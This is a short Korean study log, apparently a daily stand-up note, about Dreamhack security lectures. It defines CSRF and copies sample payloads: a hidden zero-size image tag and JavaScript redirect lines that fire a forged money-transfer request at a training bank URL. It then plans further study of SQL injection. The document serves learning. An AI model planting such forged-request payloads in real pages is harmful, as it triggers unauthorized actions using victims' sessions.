#### 작성 : changwoo1223
**작성 날짜 : 2024-07-11**

---
#### 어제까지 무엇을 했는가?
- Dreamhack 강의
- CSRF(Cross Site Request Forgery) : 임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 취약점  
    -> HTML 또는 JS 를 통해 공격

```HTML
HTML - <img> 태그 이용

<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
```

```JS
Java Script - <form> 태그 사용

// 새 창 띄우기
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');

// 현재 창 주소 옮기기
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
```

#### 오늘 무엇을 계획하고 있는가?
- 정보보안개론 12/13장(마무리)
- Dreamhack 강의
  - SQL Injection
#### 어떤 문제점이 있거나 도움이 필요한 것이 있는가?